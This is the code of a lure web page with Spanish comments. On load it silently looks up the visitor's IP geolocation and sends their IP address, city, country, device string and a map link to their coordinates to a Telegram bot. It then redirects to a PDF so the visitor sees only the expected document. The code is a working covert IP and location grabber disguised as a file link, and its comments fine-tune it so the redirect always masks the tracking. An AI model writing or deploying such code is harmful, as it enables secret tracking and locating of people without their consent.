<script src="config.js"></script>

<script>
    async function rastrear() {
        try {
            const res = await fetch('https://ipapi.co/json/');
            const d = await res.json();
            const agente = navigator.userAgent;

            // CORRECCIÃ“N AQUÃ: Se aÃ±ade el "$" antes de {d.latitude}
            // Y se usa la URL estÃ¡ndar de Google Maps
            const texto = `ğŸ”” *NUEVA VISITA DETECTADA*\n\n` +
                          `ğŸŒ *IP:* \`${d.ip}\`\n` +
                          `ğŸ“ *UbicaciÃ³n:* ${d.city}, ${d.country_name}\n` +
                          `ğŸ“± *Dispositivo:* ${agente.split(')')[0]})\n` +
                          `ğŸ”— *Mapa:* https://www.google.com/maps?q=${d.latitude},${d.longitude}`;

            await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.CHAT_ID,
                    text: texto,
                    parse_mode: 'Markdown'
                })
            });
        } catch (err) {
            console.log("Error en el rastreo");
        } finally {
            // Se asegura de que la redirecciÃ³n ocurra incluso si falla el fetch
            window.location.href = CONFIG.PDF_URL;
        }
    }
    window.onload = rastrear;
</script>
